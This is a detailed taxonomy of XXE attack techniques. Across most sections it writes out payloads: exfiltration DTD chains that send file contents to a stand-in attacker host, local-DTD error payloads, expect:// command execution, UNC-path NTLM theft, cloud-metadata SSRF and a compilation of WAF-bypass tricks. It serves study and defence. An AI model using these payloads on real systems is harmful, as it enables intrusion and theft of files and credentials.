# XXE (XML External Entity) Mutation/Variation Taxonomy

---

## Classification Structure

XXE vulnerabilities arise from the fundamental design of XML: the language specification permits documents to reference external resources via entity declarations in Document Type Definitions (DTDs). When an XML parser processes untrusted input with entity resolution enabled, attackers can leverage this mechanism to read local files, perform server-side request forgery, exfiltrate data, or cause denial of service.

This taxonomy organizes the XXE attack surface along three axes. **Axis 1 (Mutation Target)** classifies techniques by the structural component of XML being exploited — entity types, DTD loading mechanisms, protocol handlers, carrier formats, encoding layers, parser-specific behaviors, and entity expansion structures. **Axis 2 (Exploitation Channel)** describes how the attacker retrieves data or achieves impact — direct in-band response, out-of-band exfiltration, error-based leakage, SSRF pivoting, or resource exhaustion. **Axis 3 (Attack Scenario)** maps techniques to real-world impact contexts.

The root cause is singular: XML parsers that resolve entities by default, combined with the specification's allowance of external resource references. Every mutation in this taxonomy exploits a variation of this fundamental mechanism.

### Axis 2 Summary: Exploitation Channels

| Channel | Mechanism | Data Return |
|---------|-----------|-------------|
| **Direct (In-Band)** | Entity value reflected in HTTP response | Full file content in response body |
| **Out-of-Band (OOB)** | Entity triggers HTTP/FTP/DNS callback to attacker server | Data exfiltrated via URL parameter or FTP data channel |
| **Error-Based** | Malformed entity triggers parser error containing file content | Data leaked in error message |
| **Blind Detection** | No data return; confirmed via timing or OOB interaction | Boolean: vulnerable or not |
| **SSRF Pivot** | Entity URL targets internal service | Internal service response or side effects |
| **Resource Exhaustion** | Entity expansion consumes memory/CPU | Denial of service |

---

## §1. Entity Type & Declaration Mutations

XML defines two fundamental entity categories — general entities (referenced with `&name;` in document content) and parameter entities (referenced with `%name;` within DTDs). The choice between them, combined with internal vs. external declaration, determines what data can be accessed and how it can be exfiltrated.

### §1-1. General External Entities (Classic XXE)

The most straightforward XXE variant: an external general entity is declared with a `SYSTEM` or `PUBLIC` identifier pointing to a target resource, then referenced in the document body. If the parser resolves it and the response reflects the entity value, the attacker reads the file directly.

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **SYSTEM file read** | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` referenced as `&xxe;` in body | `<data>&xxe;</data>` returns file content |
| **PUBLIC entity** | Uses `PUBLIC` identifier with fallback `SYSTEM` URI; some parsers try public catalog first | `<!ENTITY xxe PUBLIC "-//attacker//DTD//EN" "file:///etc/passwd">` |
| **HTTP entity** | `SYSTEM "http://internal-host/admin"` triggers SSRF | Used for internal service probing (§7-2) |

**Condition**: Parser must allow external general entities and reflect the resolved value in the response. This is the "classic" XXE that most tutorials describe.

### §1-2. Parameter Entities

Parameter entities (`%name;`) are only valid within DTD declarations. They are critical for blind XXE exploitation because they enable dynamic construction of entity declarations — something general entities cannot do.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **External parameter entity (OOB detection)** | `<!ENTITY % xxe SYSTEM "http://attacker.com/canary"> %xxe;` | Confirms vulnerability via OOB callback even when no data is reflected |
| **Nested parameter entity (data exfiltration)** | `%file;` loads target file, `%exfil;` constructs URL containing file content, triggers HTTP request | Requires external DTD (§2-2) because nested parameter entity references are prohibited in internal DTD subset |
| **Parameter entity in internal DTD** | Direct use within internal DTD `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe;]>` | Works for OOB detection but cannot nest entities for data exfiltration |

**Critical constraint**: The XML specification prohibits referencing a parameter entity within the definition of another entity in the internal DTD subset. This restriction drives the need for external DTD loading (§2) in blind exfiltration scenarios.

### §1-3. Character and Predefined Entities

These are not attack vectors themselves but interact with exploitation techniques by causing parser failures during entity resolution.

| Subtype | Mechanism | Impact on Exploitation |
|---------|-----------|----------------------|
| **XML special characters in file content** | Files containing `<`, `>`, `&` break entity expansion when inserted into XML context | Forces use of CDATA wrapping (§5-4) or OOB/FTP exfiltration (§3-3) |
| **Percent sign in file content** | `%` in exfiltrated file content breaks parameter entity resolution | Cannot be exfiltrated via parameter entity URL; requires FTP channel or error-based method |
| **Non-Unicode bytes** | Bytes below `0x20` (except `\t`, `\n`, `\r`) are invalid in XML 1.0 | Binary files cannot be exfiltrated directly; requires Base64 via PHP wrappers (§3-4) or similar encoding |

---

## §2. DTD Loading Mechanism Mutations

The DTD is the vehicle through which entity declarations are introduced. The source and structure of the DTD determines what entity nesting techniques are available and what restrictions apply.

### §2-1. Internal DTD Subset

Entity declarations placed directly within `<!DOCTYPE foo [ ... ]>` in the XML document itself.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Inline general entity** | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | Simplest attack; requires entity reflection in response |
| **Inline parameter entity (OOB only)** | `<!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe;` | Can trigger OOB but cannot nest entities for data exfiltration |

**Limitation**: The XML specification's prohibition on nested parameter entity references within internal DTDs means that data exfiltration via parameter entities requires an external DTD.

### §2-2. External DTD Loading

The parser fetches a DTD from an attacker-controlled server, enabling nested parameter entity techniques.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Remote DTD via SYSTEM** | `<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;` | Requires outbound HTTP from target server |
| **Remote DTD via PUBLIC** | Uses PUBLIC identifier with SYSTEM fallback URI | Some parsers prefer PUBLIC catalog lookup |
| **DTD-hosted nested exfiltration** | External DTD defines: `<!ENTITY % data SYSTEM "file:///etc/passwd"> <!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%data;'>"> %exfil; %send;` | The canonical blind XXE exfiltration chain |

### §2-3. Local DTD Repurposing

When outbound connections are blocked, attackers can repurpose DTD files already present on the target system's filesystem. By redefining entities declared in a local DTD within the internal DTD subset, error-based exfiltration becomes possible without any external network access.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Linux local DTD** | Redefines entities in `/usr/share/yelp/dtd/docbookx.dtd` or `/usr/share/xml/fontconfig/fonts.dtd` | DTD file must exist on target; entity name must match |
| **Windows local DTD** | Redefines entities in `C:\Windows\System32\wbem\xml\cim20.dtd` or similar | Windows-specific DTD paths |
| **Custom application DTD** | Application ships its own DTD files that can be repurposed | Requires knowledge of application's DTD file locations |

**Mechanism**: The internal DTD subset redefines a parameter entity from the local DTD, injecting a nested entity that triggers a parsing error containing the target file's content. This works because entity redefinition in the internal subset overrides the external (local) DTD's definition, and the nesting prohibition is bypassed since the entity was *originally* declared in an external DTD.

**Example** (using Yelp DTD on Linux):
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

### §2-4. Hybrid DTD Techniques

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **DTD chaining** | Internal DTD loads external DTD, which loads another external DTD | Multi-hop entity resolution; each hop can add new entities |
| **Conditional DTD sections** | `<![ INCLUDE [ ... ]]>` and `<![ IGNORE [ ... ]]>` controlled by parameter entities | Only valid in external DTD subset; can be used for conditional payload selection |

---

## §3. Protocol Handler & URI Scheme Mutations

The URI scheme in `SYSTEM` identifiers determines what resources the parser can access. Different XML parsers support different protocols, creating a rich attack surface beyond simple `file://` reads.

### §3-1. File System Protocols

| Subtype | Mechanism | Parser Support |
|---------|-----------|---------------|
| **`file:///`** | Direct local file read | Universal — all parsers |
| **`file:///c:/`** | Windows file path | Windows-based parsers |
| **`file:////server/share`** | UNC path for SMB/CIFS access | Windows — triggers NTLM authentication to attacker's SMB server (§7-4) |
| **`netdoc:///`** | Java-specific alias for `file://` | Java XML parsers (legacy) |

### §3-2. HTTP/HTTPS Protocols

| Subtype | Mechanism | Use Case |
|---------|-----------|----------|
| **`http://` SSRF** | Parser makes HTTP request to specified URL | Internal service access, cloud metadata (§7-2) |
| **`https://`** | Same as HTTP but encrypted | Bypass network monitoring; requires parser TLS support |
| **HTTP with query string exfiltration** | `http://attacker.com/?data=%file;` | OOB data exfiltration via URL parameter |

### §3-3. FTP Protocol

| Subtype | Mechanism | Key Advantage |
|---------|-----------|---------------|
| **FTP OOB exfiltration** | Entity URL `ftp://attacker.com:2121/%file;` | FTP data channel can handle multi-line content that HTTP URL parameters cannot |
| **FTP for special characters** | FTP tolerates characters that break HTTP URLs | Can exfiltrate files containing `#`, `?`, and some `&` occurrences |

**Advantage over HTTP**: HTTP OOB exfiltration embeds file content in a URL, which breaks on newlines and special characters. FTP sends file content over a data channel, handling multi-line files natively (though `%` and some control characters still cause issues).

### §3-4. PHP Stream Wrappers

PHP's libxml2 integration exposes PHP stream wrappers to the XML parser, dramatically expanding the attack surface.

| Subtype | Mechanism | Impact |
|---------|-----------|--------|
| **`php://filter/convert.base64-encode/resource=`** | Base64-encodes file content before entity resolution | Solves special character problem — any file can be exfiltrated cleanly |
| **`php://filter` chain** | Chains multiple filters (e.g., `string.rot13`, `convert.iconv`) | Can transform file content to bypass WAF detection |
| **`expect://`** | Executes system command (requires `expect` extension) | Direct RCE: `<!ENTITY xxe SYSTEM "expect://id">` |
| **`data://`** | Inline data URI | `data://text/plain;base64,BASE64PAYLOAD` — bypass keyword filters |
| **`phar://`** | Triggers PHP deserialization on Phar archive | XXE → Phar deserialization → RCE chain |
| **`compress.zlib://`** | Read compressed files | Access `.gz` files or bypass content inspection |

### §3-5. Java-Specific Protocols

| Subtype | Mechanism | Impact |
|---------|-----------|--------|
| **`jar://`** | Access files within ZIP/JAR archives via URL | `jar:http://attacker.com/evil.jar!/file.txt` — parser downloads archive, extracts file; temporary file left on disk |
| **`jar:` for temporary file creation** | Parser downloads and saves JAR to temp directory | Can plant files on the filesystem; combined with other vulns for RCE |
| **`gopher://` (legacy)** | Raw TCP socket communication | Deprecated in modern Java; when available, enables arbitrary TCP protocol interaction |
| **`netdoc://`** | Alternative to `file://` in Java | May bypass `file://` blocklist checks |

### §3-6. DNS-Based Detection

| Subtype | Mechanism | Use Case |
|---------|-----------|----------|
| **DNS OOB via subdomain** | `http://%file;.attacker.com/` | Exfiltrate small data chunks via DNS subdomain queries; works even when HTTP is blocked |
| **DNS canary** | `http://unique-id.attacker-dns.com/` | Pure vulnerability detection without data exfiltration |

---

## §4. XML Format & Carrier Mutations

XXE is not limited to raw XML endpoints. Any application feature that processes XML-based formats is a potential attack surface, including file uploads, document parsers, and API endpoints.

### §4-1. Document Format Carriers

Many common document formats are ZIP archives containing XML files. Injecting XXE payloads into these embedded XML files can reach parsers that developers may not realize are processing XML.

| Subtype | Carrier Format | XML Target File | Typical Entry Point |
|---------|---------------|-----------------|-------------------|
| **DOCX/PPTX/XLSX** | Office Open XML (OOXML) | `[Content_Types].xml`, `word/document.xml`, `xl/sharedStrings.xml` | File upload, document import, data import |
| **ODT/ODS/ODP** | OpenDocument Format | `content.xml`, `meta.xml`, `styles.xml` | File upload, document conversion |
| **SVG** | Scalable Vector Graphics | The SVG file itself (XML root) | Image upload, avatar upload, profile picture |
| **PDF (XFA)** | XFA forms embedded in PDF | XFA XML stream within PDF structure | Form upload, document processing (CVE-2025-66516) |

**Example (SVG)**:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### §4-2. API & Protocol Carriers

| Subtype | Protocol/Format | Mechanism |
|---------|----------------|-----------|
| **SOAP endpoints** | SOAP/XML Web Services | XML body directly contains entity declarations; legacy services often have permissive parser configs |
| **REST with XML Content-Type** | REST APIs accepting `application/xml` | Many REST APIs that primarily use JSON also accept XML if `Content-Type: application/xml` is sent |
| **XML-RPC** | XML-RPC protocol | Method calls are XML documents; rarely hardened against XXE |
| **RSS/Atom feeds** | Syndication feeds | Feed parsers that process user-submitted feed URLs |
| **SAML** | Security Assertion Markup Language | SAML assertions and responses are XML; XXE in SAML can bypass authentication |
| **XMPP** | Extensible Messaging and Presence Protocol | Chat protocol using XML streams |

### §4-3. Content-Type Confusion

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **JSON-to-XML swap** | Change `Content-Type: application/json` to `Content-Type: application/xml` and send XML body | Backend framework auto-detects and routes to XML parser |
| **Multipart XML injection** | XML payload in multipart form data field | Parser processes XML from form field value |
| **URL-encoded XML** | XML payload URL-encoded in POST parameter | Application decodes and parses XML from parameter |

### §4-4. XInclude Injection

When the application inserts user input into a server-side XML document (rather than parsing a user-supplied document), the attacker cannot control the DOCTYPE. XInclude provides an alternative.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **XInclude file read** | `<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" parse="text"/>` | Parser must have XInclude processing enabled |
| **XInclude with fallback** | `<xi:fallback>` element provides alternative content if primary `href` fails | Useful for error-based information gathering |

### §4-5. XSLT-Related XXE

| Subtype | Mechanism | Impact |
|---------|-----------|--------|
| **XXE within XSLT stylesheet** | Entity declarations in XSLT file's DOCTYPE | If user can supply/influence XSLT stylesheets, XXE applies |
| **`xsl:document()` function** | XSLT function that reads external documents | File read without entity declarations |
| **XSLT to RCE** | `xsl:script` or Java/C# extension functions in XSLT | Full code execution via XSLT processor extensions |

---

## §5. Encoding & Obfuscation Mutations

Encoding-based mutations target the gap between what a WAF/IDS can parse and what the XML parser actually processes. Since XML supports multiple character encodings and the parser auto-detects encoding, this creates a rich evasion surface.

### §5-1. Character Encoding Bypass

| Subtype | Mechanism | WAF Impact |
|---------|-----------|-----------|
| **UTF-16 BE/LE** | `<?xml version="1.0" encoding="UTF-16BE"?>` with payload in UTF-16 | WAF sees binary data; XML parser decodes correctly |
| **UTF-32 variants** | UTF-32BE, UTF-32LE, UCS-4 (2143), UCS-4 (3412) | Rare encodings that most WAFs cannot decode |
| **UTF-7** | `<?xml version="1.0" encoding="UTF-7"?>` | Legacy encoding; some parsers support it, most WAFs do not |
| **EBCDIC** | IBM mainframe character encoding | Niche but valid XML encoding; completely opaque to standard WAFs |
| **Mixed encoding** | Start document in one encoding, switch mid-document | Exploits parser's encoding detection vs. WAF's static analysis |

**Conversion example**: `iconv -f UTF-8 -t UTF-16BE payload.xml > payload_utf16.xml`

### §5-2. XML Declaration Manipulation

| Subtype | Mechanism | Effect |
|---------|-----------|--------|
| **Extra whitespace in `<?xml?>`** | `<?xml    version="1.0"    encoding="UTF-8"?>` | Breaks WAF regex patterns expecting specific formatting |
| **Missing XML declaration** | Omit `<?xml?>` entirely; parser uses default encoding | WAF may not recognize document as XML |
| **Encoding declaration mismatch** | Declare one encoding in `<?xml?>`, send document in another | Parser behavior varies; can confuse both WAF and parser |

### §5-3. HTML Entity Encoding in DTD

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **Hex character references** | `&#x25;` for `%`, `&#x73;` for `s` | Bypass keyword filters for `SYSTEM`, `ENTITY`, etc. |
| **Decimal character references** | `&#37;` for `%`, `&#115;` for `s` | Alternative to hex encoding |
| **Keyword obfuscation** | Encode `SYSTEM` as `S&#x59;STEM` or `&#83;&#89;&#83;&#84;&#69;&#77;` | Bypass WAF rules matching literal `SYSTEM` keyword |

### §5-4. CDATA Wrapping

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **CDATA exfiltration wrapper** | External DTD constructs `<![CDATA[%file;]]>` around file content via entity concatenation | Solves XML special character problem for `<`, `>`, `&` |
| **CDATA in OOB payload** | Wrap exfiltrated data in CDATA before sending via HTTP/FTP | Reduces parsing errors during exfiltration |

**Limitation**: CDATA wrapping cannot handle files containing `]]>` (which terminates the CDATA section) or `%` (which breaks parameter entity resolution).

### §5-5. Comment and Whitespace Injection

| Subtype | Mechanism | Effect |
|---------|-----------|--------|
| **XML comments in DOCTYPE** | `<!DOCTYPE foo [<!-- comment --><!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | Break WAF pattern matching |
| **Newlines within declarations** | Split `<!ENTITY` across multiple lines | WAF may only inspect first N bytes or first line |
| **Null bytes** | Insert null bytes between tokens | Some WAFs truncate at null bytes; XML parser skips them |

---

## §6. Parser-Specific Behavior Mutations

XML parser implementations vary significantly across languages and libraries. Default configurations, supported features, and edge-case handling differ, creating parser-specific attack vectors.

### §6-1. Java XML Parsers

Java has the broadest XML processing ecosystem and, historically, the most permissive default configurations.

| Parser/API | Default XXE Status | Key Behavior |
|-----------|-------------------|-------------|
| **DocumentBuilderFactory** | Vulnerable by default (pre-JAXP security properties) | Must explicitly disable external entities and DTDs |
| **SAXParserFactory** | Vulnerable by default | Same mitigation as DocumentBuilderFactory |
| **XMLInputFactory (StAX)** | `IS_SUPPORTING_EXTERNAL_ENTITIES` defaults to unspecified (implementation-dependent) | Must set `IS_SUPPORTING_EXTERNAL_ENTITIES` and `SUPPORT_DTD` to false |
| **TransformerFactory** | Vulnerable by default | Supports `jar://`, `netdoc://` protocols |
| **DOM4J** | Vulnerable by default | Requires SAXReader configuration |
| **JAXB Unmarshaller** | Generally safe in newer versions | Depends on underlying parser configuration |

**Java-specific protocols**: `jar://`, `netdoc://`, and (in older versions) `gopher://` are available through Java's URL handler mechanism (§3-5).

### §6-2. PHP / libxml2

| Aspect | Behavior |
|--------|----------|
| **PHP < 8.0** | `libxml_disable_entity_loader(false)` is default; XXE is possible |
| **PHP >= 8.0** | External entity loading disabled by default; `libxml_disable_entity_loader()` deprecated |
| **`LIBXML_NOENT` flag** | Explicitly enables entity substitution — re-introduces XXE even in PHP 8.0+ |
| **`simplexml_load_string()` with options** | Passing `LIBXML_NOENT` as option makes it vulnerable |
| **PHP stream wrappers** | `php://filter`, `expect://`, `phar://`, `data://` available via libxml2's I/O handlers (§3-4) |

### §6-3. .NET XML Parsers

| Parser/Class | Default XXE Status | Key Behavior |
|-------------|-------------------|-------------|
| **XmlReader (>= .NET 4.5.2)** | Safe by default (`DtdProcessing.Prohibit`) | Must explicitly enable DTD processing to be vulnerable |
| **XmlTextReader (< .NET 4.5.2)** | Vulnerable by default | Must set `DtdProcessing = DtdProcessing.Prohibit` |
| **XmlDocument (>= .NET 4.5.2)** | Safe by default (null `XmlResolver`) | Setting `XmlResolver` re-introduces vulnerability |
| **XPathNavigator** | Depends on underlying reader | Inherits reader's configuration |
| **DTD prohibition bypass (CVE-2024-30043)** | XmlReader resolves parameter entities *before* checking DTD prohibition | OOB XXE possible even with `DtdProcessing.Prohibit` in specific configurations |

### §6-4. Python XML Parsers

| Parser | Default XXE Status |
|--------|-------------------|
| **xml.etree.ElementTree** | Safe — does not process external entities |
| **xml.dom.minidom** | Safe by default |
| **xml.sax** | Potentially vulnerable — depends on handler configuration |
| **lxml** | Vulnerable if `resolve_entities=True` (not default since lxml 3.x) |
| **defusedxml** | Hardened library — safe alternative for all Python XML parsing |

### §6-5. Ruby XML Parsers

| Parser | Default XXE Status |
|--------|-------------------|
| **Nokogiri (>= 1.5.4)** | External entities disabled by default |
| **Nokogiri (`NOENT` flag)** | Passing `Nokogiri::XML::ParseOptions::NOENT` re-enables entity processing |
| **REXML** | Generally safe — does not resolve external entities |

### §6-6. libxml2 Behavior (Shared Across Languages)

libxml2 underpins XML parsing in PHP, Python (lxml), Ruby (Nokogiri), and many other languages. Its behavior is the common thread.

| Behavior | Description | Impact |
|----------|-------------|--------|
| **Encoding auto-detection** | Reads BOM and `<?xml encoding="">` to determine encoding | Encoding-based WAF bypass (§5-1) |
| **Entity depth limits** | Limits nested entity expansion to prevent billion laughs | Can be circumvented with quadratic blowup (§7-1) |
| **`xmlCtxtUseOptions()`** | Processes options flags like `XML_PARSE_NOENT`, `XML_PARSE_DTDLOAD` | Misconfigured flags at application level re-introduce XXE |

---

## §7. Impact-Oriented Mutation Categories

These categories organize techniques by their ultimate effect rather than their structural mechanism, serving as the bridge between mutation mechanics and real-world exploitation.

### §7-1. Denial of Service via Entity Expansion

XML entity expansion can consume exponential or quadratic memory/CPU resources without requiring any external network access.

| Subtype | Mechanism | Resource Consumption |
|---------|-----------|---------------------|
| **Billion Laughs (Exponential Expansion)** | 10 entities, each defined as 10x the previous; final entity expands to ~10^9 copies | ~3 GB memory from <1 KB payload |
| **Quadratic Blowup** | Single large entity (e.g., 55,000 chars) referenced 55,000 times | ~2.5 GB from ~200 KB payload; bypasses entity depth limits |
| **Recursive entity expansion** | Entity A references Entity B which references Entity A | Some parsers detect and block; others crash |
| **External entity DoS** | Entity points to `/dev/random`, `/dev/urandom`, or infinite HTTP stream | Parser hangs indefinitely attempting to read |
| **Decompression bomb** | `jar://` or `compress.zlib://` pointing to a zip bomb | Disk/memory exhaustion during decompression |

**Defense note**: Billion Laughs is widely detected by modern parsers via entity depth/expansion limits. Quadratic Blowup bypasses these limits because it uses flat (non-nested) repetition.

### §7-2. SSRF via XXE

XXE is one of the most reliable SSRF vectors because the parser itself makes the HTTP request, inheriting the server's network position and credentials.

| Subtype | Target | Impact |
|---------|--------|--------|
| **Cloud metadata** | `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP) | Cloud credential theft, instance takeover |
| **Internal API probing** | `http://internal-service:8080/api/admin` | Access to internal services behind firewall |
| **Port scanning** | Iterate entities over `http://target:PORT/` and observe response time/errors | Map internal network topology |
| **Localhost service access** | `http://127.0.0.1:XXXX/` | Access services bound to loopback only |

### §7-3. Data Exfiltration Chains

Complex exfiltration requires chaining multiple techniques from previous categories.

| Chain | Components | Handles Multi-line | Handles Special Chars |
|-------|-----------|-------------------|---------------------|
| **HTTP OOB (simple)** | §1-2 + §2-2 + §3-2 | No | No (`#`, `?`, `&` break URL) |
| **FTP OOB** | §1-2 + §2-2 + §3-3 | Yes (via FTP data channel) | Partial (still breaks on `%`) |
| **Error-based + local DTD** | §1-2 + §2-3 + error message reflection | Single-line only | Limited |
| **PHP filter Base64** | §3-4 + `php://filter/convert.base64-encode` | Yes (Base64 is single-line) | Yes (Base64 encodes everything) |
| **DNS exfiltration** | §3-6 + subdomain encoding | No (63 char label limit) | Limited (DNS label charset) |
| **CDATA wrapping** | §5-4 + §2-2 (external DTD) | Yes | Partial (breaks on `]]>` and `%`) |

### §7-4. NTLM Hash Theft and Relay

Windows-specific: when an XXE entity references a UNC path or SMB resource, the Windows host automatically sends NTLM authentication credentials.

| Subtype | Mechanism | Impact |
|---------|-----------|--------|
| **UNC path NTLM leak** | `<!ENTITY xxe SYSTEM "\\\\attacker.com\\share">` | NTLMv2 hash captured by Responder/Impacket; offline cracking or relay |
| **HTTP → SMB redirect** | Entity fetches HTTP URL that 302-redirects to `file://attacker.com/share` | Bypasses UNC path filtering while still triggering NTLM auth |
| **WebDAV NTLM leak** | Entity references WebDAV URL on attacker server | Windows attempts NTLM auth to WebDAV endpoint |

### §7-5. XXE-to-RCE Chains

XXE alone rarely achieves remote code execution, but it serves as a powerful primitive in multi-step chains.

| Chain | Components | Platform |
|-------|-----------|----------|
| **XXE → PHP expect://id** | §3-4 (`expect://` wrapper) | PHP with `expect` extension |
| **XXE → Phar deserialization** | XXE reads `phar://` URI triggering unserialization → gadget chain → RCE | PHP |
| **XXE → PHP filter chain (CVE-2024-2961)** | XXE + iconv filter chain bug → arbitrary file write → RCE | PHP (patched in PHP 8.x) |
| **XXE → credential theft → admin access → RCE** | Read config files containing credentials → authenticate as admin → upload webshell | Any platform |
| **XXE → SSRF → internal service exploit** | XXE triggers SSRF to vulnerable internal service | Any platform with vulnerable internal services |
| **Nested deserialization → XXE (CVE-2024-34102)** | Deserialization of crafted object triggers XML parsing with XXE | Magento/Adobe Commerce (PHP) |

---

## §8. WAF & Filter Bypass Compilation

This section consolidates bypass techniques from across the taxonomy, organized by the filtering mechanism being evaded.

### §8-1. Keyword-Based Filter Bypass

| Target Keyword | Bypass Technique | Reference |
|---------------|-----------------|-----------|
| `SYSTEM` | HTML entity encoding: `S&#x59;STEM` | §5-3 |
| `ENTITY` | Character reference: `&#69;NTITY` | §5-3 |
| `DOCTYPE` | Insert whitespace: `<!DOCTYPE  foo` or XML comments | §5-2, §5-5 |
| `file://` | Use `netdoc://` (Java) or `php://filter` (PHP) | §3-4, §3-5 |
| `/etc/passwd` | Use `php://filter/convert.base64-encode/resource=/etc/passwd` | §3-4 |

### §8-2. Content-Type & Format Bypass

| Filter | Bypass Technique | Reference |
|--------|-----------------|-----------|
| XML content blocked | Send payload in SVG, DOCX, or XLSX container | §4-1 |
| `application/xml` blocked | Use `text/xml` or `application/soap+xml` | §4-2 |
| JSON-only endpoint | Switch Content-Type to `application/xml`; framework may auto-route | §4-3 |

### §8-3. Encoding-Based Bypass

| Filter | Bypass Technique | Reference |
|--------|-----------------|-----------|
| WAF inspects UTF-8 only | Encode payload in UTF-16 or UTF-32 | §5-1 |
| WAF inspects ASCII range | Use UTF-7 or EBCDIC encoding | §5-1 |
| WAF regex on first line | Split declarations across lines, add comments | §5-5 |

### §8-4. Structural Bypass

| Filter | Bypass Technique | Reference |
|--------|-----------------|-----------|
| DTD blocked | Use XInclude instead of entity declarations | §4-4 |
| External entities blocked | Use local DTD repurposing with error-based exfiltration | §2-3 |
| Outbound HTTP blocked | Use DNS exfiltration or error-based with local DTD | §3-6, §2-3 |
| Entity expansion limited | Use quadratic blowup instead of nested expansion | §7-1 |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories |
|----------|-------------|---------------------------|
| **Local File Read** | Any application parsing XML | §1-1 + §2-1 + §3-1 |
| **Blind Data Exfiltration** | XML parsed but not reflected | §1-2 + §2-2 + §3-2/§3-3 |
| **Error-Based Exfiltration (No Outbound)** | Firewalled environment, error messages visible | §1-2 + §2-3 + §5-3 |
| **Cloud Metadata Theft** | Cloud-hosted application (AWS/GCP/Azure) | §1-1 + §3-2 + §7-2 |
| **NTLM Credential Theft** | Windows domain-joined server | §1-1 + §3-1 (UNC) + §7-4 |
| **File Upload XXE** | Application accepts DOCX/XLSX/SVG/PDF uploads | §4-1 + §1-1 |
| **API XXE** | REST/SOAP endpoint accepting XML | §4-2 + §4-3 |
| **WAF-Evaded XXE** | WAF-protected application | §5-1 + §5-3 + §8 |
| **XXE to RCE** | PHP or Java application with exploitable chain | §3-4/§3-5 + §7-5 |
| **Denial of Service** | Any application parsing XML | §7-1 |

---

## CVE / Bounty Mapping (2024–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|----------------|
| §7-5 (nested deserialization → XXE) + §1-2 + §7-2 | CVE-2024-34102 — Adobe Commerce/Magento "CosmicSting" | CVSS 9.8. Unauthenticated XXE via nested deserialization; admin JWT forgery, chainable with CVE-2024-2961 for RCE. Actively exploited in the wild. |
| §6-3 (.NET parser bypass) + §1-2 + §4-3 | CVE-2024-30043 — Microsoft SharePoint | CVSS 7.1. URL parsing confusion bypasses DTD prohibition; file read with Farm Service Account, NTLM relay, SSRF. Affects both on-prem and cloud. |
| §1-1 + §3-2 + §7-2 | CVE-2025-58360 — GeoServer | CVSS High. XXE via GetMap WMS operation; file read, SSRF, DoS. Added to CISA KEV catalog; actively exploited. |
| §4-1 (PDF/XFA carrier) + §1-1 | CVE-2025-66516 — Apache Tika | CVSS 10.0. XXE via crafted XFA content embedded in PDF files; affects tika-core, tika-pdf-module, tika-parsers. |
| §1-1 + §6-1 (Java) | CVE-2024-45072 — IBM WebSphere Application Server | Privileged user XXE; sensitive information exposure, memory consumption. |
| §1-1 + §3-2 + §6-1 | CVE-2024-22354 — IBM WebSphere Application Server Liberty | XXE with SSRF capability; remote attacker can expose sensitive information. |
| §4-1 (XLSX) + §1-1 | CVE-2025-49493 — Akamai CloudTest | XXE via uploaded XML test configuration; fixed by disabling DTD processing entirely. |

---

## Detection Tools

### Offensive Tools (Scanners & Exploiters)

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **Burp Suite Scanner** | Web applications | Automated XXE detection with blind/OOB payloads; Burp Collaborator for OOB confirmation |
| **XXEinjector** | Any XXE endpoint | Automated file retrieval via direct and OOB methods; supports HTTP, FTP, and gopher channels |
| **XXExploiter** | Any XXE endpoint | Generates payloads and auto-starts exfiltration server; supports multiple exfil channels |
| **oxml_xxe** | File upload endpoints | Embeds XXE payloads into DOCX, XLSX, PPTX, ODT, SVG files |
| **docem** | Document upload endpoints | Embeds XXE/XSS payloads into DOCX, ODT, PPTX formats |
| **dtd-finder** | Local DTD repurposing | Discovers DTD files on target filesystem; generates repurposing payloads |
| **xxeserv** | OOB exfiltration | Mini webserver with FTP support specifically for XXE data exfiltration |
| **B-XSSRF** | Blind XXE/SSRF detection | Toolkit for detecting and tracking blind XXE and SSRF interactions |

### Defensive Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **defusedxml (Python)** | Python applications | Drop-in replacement for stdlib XML parsers with XXE disabled |
| **Acunetix** | Web applications | XXE scanning with AcuSensor for white-box detection accuracy |
| **OWASP ZAP** | Web applications | Exponential entity expansion detection (Alert ID 40044) |
| **libxml2 secure defaults** | PHP/Python/Ruby apps using libxml2 | Configure `XML_PARSE_NOENT` off, `XML_PARSE_DTDLOAD` off |

---

## Summary: Core Principles

**The fundamental property** that makes the entire XXE attack class possible is XML's design decision to allow documents to reference external resources through entity declarations in DTDs. This is a specification-level feature, not a parser bug — the XML 1.0 specification explicitly defines external entities as a core mechanism. The vulnerability arises when this specification feature meets untrusted input: parsers faithfully implement the spec, and applications fail to restrict the parser's capabilities before processing user-controlled XML.

